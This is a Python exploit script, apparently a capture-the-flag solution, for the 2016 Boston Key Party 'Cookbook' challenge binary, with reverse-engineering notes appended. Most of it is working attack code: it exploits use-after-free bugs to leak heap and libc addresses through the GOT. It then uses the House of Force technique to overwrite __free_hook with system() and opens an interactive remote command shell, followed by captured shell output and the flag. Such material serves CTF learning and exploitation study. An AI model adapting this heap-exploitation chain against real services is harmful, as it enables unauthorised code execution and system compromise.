import struct
import sys
import subprocess
import socket
import telnetlib
import ctypes

"""
Cookbook - 6 - 0 solves : pwn: a top chef wrote this cookbook for me but i think he has an extra secret recipe! 
https://s3.amazonaws.com/bostonkeyparty/2016/58056c425dc617b65f94a8b558a4699fedf4a9fb.tgz
cookbook.bostonkey.party 5000


Video write-up:
 * Part 1 - Reverse Engineering the binary - https://www.youtube.com/watch?v=f1wp6wza8ZI
 * Part 2 - Leaking heap and libc address - https://www.youtube.com/watch?v=dnHuZLySS6g
 * Part 3 - Creating an arbitrary write - House of Force - https://www.youtube.com/watch?v=PISoSH8KGVI
 
All my video write-ups as YouTube playlist: https://www.youtube.com/watch?v=f1wp6wza8ZI&index=1&list=PLhixgUqwRTjywPzsTYz28I-qezFOSaUYz


References:
http://phrack.org/issues/66/10.html
https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/
"""

# ======================================================
# SETUP / HELPER FUNCTIONS
# ======================================================

PRINTF_OFFSET = None
FREE_HOOK_OFFSET = None
SYSTEM_OFFSET = None
LEAKED_HEAP_ADDR = None
FREE_HOOK_PTR = None
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# convert 0x44434241 -> "\x41\x42\x43\x44"
p32 = lambda x: struct.pack("!I", x)

# convert signed int to unsigned -1 -> 0xffffffff
def stou(i):
    return ctypes.c_uint32(i).value

# receive all strings until timeout hits
def recv_all():
    b = bytes()
    last_recv = True
    while last_recv:
        try:
            last_recv = s.recv(1024)
        except socket.timeout:
            last_recv = None
        if last_recv:
            b += last_recv
    return b.decode('latin-1')


# send string over socket
def send(msg):
    if isinstance(msg, bytes):
        s.send(msg+b'\n')
    else:
        s.send(bytes(msg+'\n', 'utf-8'))

# define some variables for local testing or target server
if len(sys.argv)>1 and sys.argv[1] == 'bkpctf':
    s.settimeout(0.5); s.connect(('cookbook.bostonkey.party', 5000))
    FREE_HOOK_OFFSET = 0x14377a + 0x73886 - 0x9c
    PRINTF_OFFSET = 0x4a130
    SYSTEM_OFFSET = 0x3b160
else:
    s.settimeout(0.05); s.connect(('127.0.0.1', 6666))
    FREE_HOOK_OFFSET = 0x13339a + 0x76c66 - 0xa0
    PRINTF_OFFSET = 0x54340 # (0x4d280) this is the offset from local libc-2.31 
    SYSTEM_OFFSET = 0x45830 # (0x40190) this is the offset from local libc-2.31



# ======================================================
# HEAP HELPER FUNCTIONS
# ======================================================

# will allocate <nr> amount of small chunks to fill holes and line everything up
def fill_heap(nr):
    print(("| heap grooming. Fill heap holes with 0x{:x} small chunks".format(nr)))
    for i in range(0,nr):
        send("g") # [g]ive your cookbook a name!
        send(hex(0x5)) # size of name in hex
        send(str(i)) # name of cookbook

# creates a recipe, dsicards it. At it's place allocate a new Ingredient and adds it to it's list.
# ingredient list: [ingredient addr][next]
def add_leak(addr,groom=0x200):
    # groom will fill up all fragemnted heap chunks. So we have a nice new fresh aligned heap to start with.
    if groom>0:
        fill_heap(groom)

    send("c") # [c]reate recipe

    send("n") # [n]ew recipe
    send("g") # [g]ive recipe a name
    send("XXX") # recipe name

    send("n") # [n]ew recipe
    send("g") # [g]ive recipe a name
    send("XXX") # recipe name

    # throw away recipe,free its space
    send("d") # [d]iscard recipe
    send("q") # [q]uit

    # add a new ingredient. Will set INGREDIENTLIST. INGREDIENTLIST will be in range of freed recipe
    send("a") # [a]dd ingredient
    send("n") # [n]ew ingredient?
    send("g") # [g]ive name to ingredient?
    send("AAAA1111") # name of ingredient
    send("e") # [e]xport saving changes (doesn't quit)?
    send("q") # [q]uit (doesn't save)?

    recv_all()
    print(("| overwriting ingredient list with stale recipe pointer to leak 0x{:08x}".format(addr)))
    send("c") # [c]reate recipe
    send("g") # [g]ive recipe a name
    OVERWRITE = b"AAAABBBBCCCC"+p32(addr)+p32(0x00000000) # Write next ingredient that is added/saved at this address
    # OVERWRITE = "AAAABBBBCCCC"+'Ð'+'0000' # Write next ingredient that is added/saved at this address
    print(OVERWRITE)
    send(OVERWRITE) # name of recipe overwrite address if ingredient list
    send("q") # [q]uit
    recv_all()

# add_leak adds new addresses to leak to the ingredient list
# this function reads the list and gathers all leaked values
def parse_ingredient(ret_leaked=True):
    recv_all()
    send("l") # [l]ist ingredients
    ingredient_list = recv_all().split("------")
    if ret_leaked:
        leaked = []
        for ingredient in ingredient_list[1:-1]:
            leak = ingredient.split("\n")[-3:-1]
            leaked.append(stou(int(leak[0][10:])))
        print(("| leaked: {}".format(" ".join(["[0x{:08x}]".format(i) for i in leaked]))))
        return leaked
    else:
        ingredients=[l.split('name: ')[1].split('\n')[0] for l in ingredient_list if l.find('name')==1]
    return ingredients




# ======================================================
# START OF EXPLOIT
# ======================================================

recv_all() # recv_all just to ignore the data sent to us
send("liveoverflow") # your name
print((recv_all().split("====================")[0])) # print banner


print("")
print("+=============================================================+")
print("| LEAK HEAP ADDRESSES")
print("+=============================================================+")

# leaks a heap address by allocating a recipe, adding ingredient places [cost][calories][ingredient] on heap.
# free writes heap address at location of cost. leak.
# the heap is always aligned and deterministic, so even though it has ASLR,
# we can use this to predict future locations of stuff on the heap
send("c") # [c]reate recipe
send("n") # [n]ew recipe
send("a") # [a]dd ingredient
send("basil") # name of ingredient
send("0") # amount of ingredient
send("p") # [p]rint current recipe
send("d") # [d]iscard recipe
recv_all()
send("p") # [p]rint current recipe
resp = recv_all() # will leak a heap pointer
LEAKED_HEAP_ADDR = int(resp.split("\n")[3].split("-")[0])
send("q") # [q]uit
print(("| leaked heap address 0x{:08x}".format(LEAKED_HEAP_ADDR)))

# remove all ingredients from the ingredient. Just makes it nicer for parse_ingredient.
# not important for exploit

def get_ingredients():
 send('l')

print("| remove all normal ingredients.")

for ingredient in parse_ingredient(ret_leaked=False):
    send("e") # [e]xterminate ingredient 
    send(ingredient) # name of ingredient
recv_all() # ignore received data.

input("| continue?...")
print("")
print("+=============================================================+")
print("|          LEAK PRINTF@GOT TO CALCULATE LIBC ADDRESS          |")
print("+=============================================================+")


# ASLR is enabled, but application itself doesn't use ASLR
# So we know the address from GOT
print(("| add address 0x{:08x} from GOT to leak.".format(0x804D010)))
add_leak(0x804D010, groom=0x200) # add a GOT address to leak function addresses
leaked = parse_ingredient() # get the leaked data
print(("| printf@GOT: 0x{:08x}".format(leaked[0]))) # first address is address of printf()
LIBC = leaked[0] - PRINTF_OFFSET # use offset of printf to calculate LIBC base
print(("| libc base address: 0x{:08x}".format(LIBC)))


input("| continue?...")
print("")
print("+=============================================================+")
print("|          USE LIBC ADDRESS TO GET FREE_HOOK POINTER          |")
print("+=============================================================+")

FREE_HOOK_PTR = LIBC+FREE_HOOK_OFFSET # with the LIBC base we can calculate the address of the free_hook pointer
print(("| try to leak free_hook address from 0x{:08x}".format(FREE_HOOK_PTR)))
add_leak(FREE_HOOK_PTR, groom=0x200) # add pointer to free_hook address to the leaking ingredients list
leaked = parse_ingredient()
FREE_HOOK = leaked[-1]
print(("| got free_hook address: 0x{:08x}".format(FREE_HOOK)))
fill_heap(0x100) # some heap grooming. align everything nicely


input("| continue?...")
print("")
print("+=============================================================+")
print("|                    OVERWRITING THE WILDERNESS               |")
print("+=============================================================+")


# we want to overwrite the last value on the heap which says how much space is left
# in this heap arena. We overwrite it with 0xFFFFFFFF. So malloc() will never think the
# heap is low on memory, and never mmap() new memory for it. Thus we can basically
# write everywhere
print("| create another stale recipe pointer")
send("c") # [c]reate recipe
send("n") # [n]ew recipe
send("d") # [d]iscard recipe
send("q") # [q]uit

print("| create two ingredients and remove one")
send("a") # [a]dd ingredient
send("n") # [n]ew ingredient?
send("n") # [n]ew ingredient?
send("d") # [d]iscard current ingredient?
send("q") # [q]uit (doesn't save)?

print("| Use after free recipe overwriting the wilderness with 0xFFFFFFFF")
send("c") # [c]reate recipe
send("g") # [g]ive recipe a name
send(p32(0x0) + p32(0x0)+ p32(0xFFFFFFFF) + p32(0x0)) 
send("q") # [q]uit

input("| continue?...")
print("")
print("+=============================================================+")
print("|   OVERWRITING THE av->top POINTER WITH ADR NEAR FREE_HOOK   |")
print("+=============================================================+")

HEAP_WILDERNESS = LEAKED_HEAP_ADDR+0x6b1c # calculate the current end (the wilderness) of the heap
print(("| the wilderness (top/last heap block) is at 0x{:08x}".format(HEAP_WILDERNESS)))
HEAP_INFO = LIBC-0x1000 # calculate the address where the HEAP info, like the av->top struct is stored
print(("| all the heap info stuff is at 0x{:08x}".format(HEAP_INFO)))
MAGIC_MALLOC = (FREE_HOOK-16)-HEAP_WILDERNESS+0x26c8 # calculate the MAGIC_MALLOC valie
print(("| this magic malloc(0x{:08x}) value will transfor av->top pointer to point to free_hook".format(MAGIC_MALLOC)))


input("| continue?...")
print("")
print("+=============================================================+")
print("|            OVERWRITING FREE_HOOK WITH SYSTEM()              |")
print("+=============================================================+")

send("g") # [g]ive your cookbook a name!
send(hex(MAGIC_MALLOC)) # use the magic malloc number
send("X") # name

# the next malloc will allocate a block at free_hook, thus we can write anything to that address
# we write the address of system() to it
print(("| overwrite free_hook with system() 0x{:08x}".format(LIBC+SYSTEM_OFFSET)))
send("g") # [g]ive your cookbook a name!
send("0x5") # length of name
send(p32(LIBC+SYSTEM_OFFSET))


input("| continue?...")
print("")
print("+=============================================================+")
print("|           !!!     LET'S HOPE WE HAVE A SHELL     !!!        |")
print("+=============================================================+")

while True:
    cmd = input("~LO> ")
    send("g") # [g]ive your cookbook a name!
    send(hex(len(cmd)+2)) # length is the size of the command
    send(cmd) # send command
    recv_all()
    # free the cookbook name to trigger the free_hook
    send("R") # [R]emove cookbook name
    print((recv_all().split("====================")[0]))

"""
Cool Trick:
recv_all()
t = telnetlib.Telnet()
t.sock = s
t.interact()


Shell:
> id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
> uname -a
Linux ip-172-31-61-128 3.13.0-74-generic #118-Ubuntu SMP Thu Dec 17 22:52:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
> ls -la
total 1816
drwxr-xr-x 2 cooking-manager cooking-manager    4096 Mar  5 01:38 .
drwxr-xr-x 3 root            root               4096 Mar  4 03:51 ..
-rw-r--r-- 1 cooking-manager cooking-manager     220 Mar  4 03:51 .bash_logout
-rw-r--r-- 1 cooking-manager cooking-manager    3771 Mar  4 03:51 .bashrc
-rw-r--r-- 1 cooking-manager cooking-manager     675 Mar  4 03:51 .profile
-rwxr-xr-x 1 root            root              17936 Mar  4 04:05 cookbook
-rw-r--r-- 1 root            root                 38 Mar  5 01:38 key
-rwxrwxr-x 1 cooking-manager cooking-manager 1807496 Mar  4 04:10 libc.so.6
-rwxr-xr-x 1 root            root                136 Mar  4 23:46 run.sh
> cat key
BKPCTF{hey_my_grill_doesnt_work_here}


https://twitter.com/LiveOverflow/status/706543494794444802
"Solved a challenge over my skill level at @BkPctf. Worked on it over 24h... Exhausted but proud!
20423924ec8e9218332289519b7d74e258a84910"

$ echo -n "LiveOverflow - BKPCTF{hey_my_grill_doesnt_work_here}" | sha1sum
20423924ec8e9218332289519b7d74e258a84910

"""


"""
[l]ist ingredients
    * loop over ingredient list. Global Pointer 0x804D094 to array at 0x0804e510 (careful aslr)
    * print ingredients
[r]ecipe book
    * prints your name + recipe + ingredients of recipes
[a]dd ingredient
        * currently edited ingredient stored at global var 0x804D09C (INGREDIENT)
        [l]ist current stats?
            * if INGREDIENT is set, print it
        [n]ew ingredient?
            * malloc(0x90), store pointer in INGREDIENT
        [c]ontinue editing ingredient?
            * ? no function ???
        [d]iscard current ingredient?
            * free(INGREDIENT) - doesn't set INGREDIENT to 0... use after free
        [g]ive name to ingredient?
            * calloc(0x80)
            * read name to INGREDIENT + 8
        [p]rice ingredient?
            * store number at INGREDIENT + 4
        [s]et calories?
            * store number at INGREDIENT + 0
        [q]uit (doesn't save)?
            * just go back
        [e]xport saving changes (doesn't quit)?
            * save ingredient in ingredient list, set INGREDIENT to 0
[c]reate recipe
        * currently edited recipe stored at global var 0x804D0A0 (RECIPE)
        [n]ew recipe
            * calloc(0x40C), store pointer in RECIPE
        [d]iscard recipe
            * free(RECIPE) - doesn't reset RECIPE... use after free
        [a]dd ingredient
            * read 0x90 bytes on the stack as string and search ingredient
            * if ingredient found, ask for how many should be added
            * allocates small area to store points and number
            * single linked list. start of linked list stored at RECIPE+0
        [r]emove ingredient
        [g]ive recipe a name
            * fgets(0x40) to *RECIPE+0x8C
        [i]nclude instructions
            * exactly the same function as give name
        [s]ave recipe
        [p]rint current recipe
            * print receipe, follow 
        [q]uit
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
"""

